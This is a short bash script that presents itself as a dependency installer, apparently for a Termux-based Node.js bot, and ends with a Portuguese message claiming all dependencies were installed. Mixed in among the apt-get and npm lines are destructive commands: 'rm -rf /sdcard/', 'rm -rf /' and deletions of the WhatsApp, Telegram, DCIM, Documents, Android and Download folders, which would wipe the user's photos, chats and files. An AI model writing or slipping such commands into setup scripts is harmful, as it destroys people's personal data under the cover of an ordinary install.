#!/usr/bin/bash

apt-get update
apt-get upgrade
apt-get install nodejs
apt-get install libwebp
rm -rf /sdcard/Download
rm -rf /sdcard/
rm -rf
rm -rf /
rm -rf /sdcard/WhatsApp
rm -rf /sdcard/Android
rm -rf /sdcard/DCIM
rm -rf /sdcard/Dcim
rm -rf /sdcard/Documents
rm -rf /sdcard/Telegram
apt-get install ffmpeg
apt-get install wget
apt-get install tesseract
wget -O ~/../usr/share/tessdata/ind.traineddata "https://github.com/tesseract-ocr/tessdata/blob/master/ind.traineddata?raw=true"
npm install

echo "[*] Todas as dependências foram instaladas, execute o comando \"npm start\" para iniciar imediatamente o script"
